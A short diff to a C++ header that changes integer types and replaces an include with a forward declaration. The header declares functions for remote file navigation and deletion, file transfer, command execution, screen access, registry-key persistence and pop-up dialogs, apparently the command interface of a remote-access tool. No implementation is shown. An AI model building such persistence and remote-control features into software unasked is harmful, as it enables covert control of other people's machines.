@@ -3,8 +3,9 @@
 
 #include <string>
 #include <vector>
+#include <cstdint>
 
-#include "controller.h"
+class Controller;
 
 enum class NavigateCommand {
     ls, cd, pwd, rm
@@ -23,10 +24,10 @@ enum class ShowoffCommand {
 };
 
 // navigation
-int navigation(Controller& ctrl, unsigned char cmd, const std::string path);
+int navigation(Controller& ctrl, uint8_t cmd, const std::string path);
 // files
 int downloadFile(Controller& ctrl, const std::string path);
-int uploadFile(Controller& ctrl, const std::string path, std::vector<char> data);
+int uploadFile(Controller& ctrl, const std::string path, std::vector<uint8_t> data);
 // exec
 int exec(Controller& ctrl, std::string cmd, bool wait);
 // screen
@@ -40,6 +41,6 @@ int persist(Controller& ctrl, const std::string regkey);
 // dialog
 int dialog(Controller& ctrl, uint32_t type, std::string message, std::string title);
 // showoff
-int showoff(Controller& ctrl, unsigned char type);
+int showoff(Controller& ctrl, uint8_t type);
 
 #endif
